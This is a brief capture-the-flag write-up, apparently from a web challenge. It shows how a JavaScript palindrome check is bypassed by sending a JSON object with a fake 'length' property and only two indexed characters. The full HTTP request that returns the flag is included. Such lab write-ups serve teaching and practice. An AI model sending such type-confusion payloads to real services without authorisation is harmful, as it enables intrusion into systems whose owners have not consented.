1. Firtsly analyze the page, source and so on.
You can see the vulnerable part of logic
```
const IsPalinDrome = (string) => {
    if (string.length < 1000) { 
        return 'Tootus Shortus'; 
    }
    
    for (const i of Array(string.length).keys()) { 
        const original = string[i];
        const reverse = string[string.length - i - 1];
        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }
    return null; // Успех -> Возврат Флага
}
```
Exactly the loop **if** 
```
if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
	 }
```

2. Test on Burp Repeater:
I posted payload:
```
{"palindrome":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
```
As a result get response: `413 Request Entity Too Large`

3. Then tryed post payload of length int:
```
{
  "palindrome":{
      "length":1000
  }
}
```
As a result get response: `400 Bad Request: Notter Palindromer!!`

4. Final payload:
```
POST / HTTP/1.1
Host: 154.57.164.73:32351
Content-Type: application/json
Content-Length: 52

{"palindrome":{"length":"1000","0":"a","999":"a"}}
```
As a result I get flag. Thanks
